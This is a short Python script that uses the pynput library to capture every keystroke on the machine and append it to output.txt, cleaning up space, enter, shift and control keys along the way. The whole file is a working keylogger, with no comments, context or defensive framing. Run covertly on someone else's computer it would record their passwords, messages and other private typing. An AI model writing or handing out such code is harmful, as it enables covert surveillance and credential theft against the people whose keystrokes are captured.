from pynput.keyboard import Listener

def logging_them_keys(key):
    input = str(key)
    input = input.replace("'", "")

    if input == 'Key.space':
        input = ' '
    if input == 'Key.shift':
        input = ''
    if input == "Key.ctrl_l":
        input = ""
    if input == "Key.ctrl_r":
        input = ""
    if input == "Key.enter":
        input = "\n"
    with open("output.txt", 'a') as f:
        f.write(input)

with Listener(on_press=logging_them_keys) as l:
    l.join()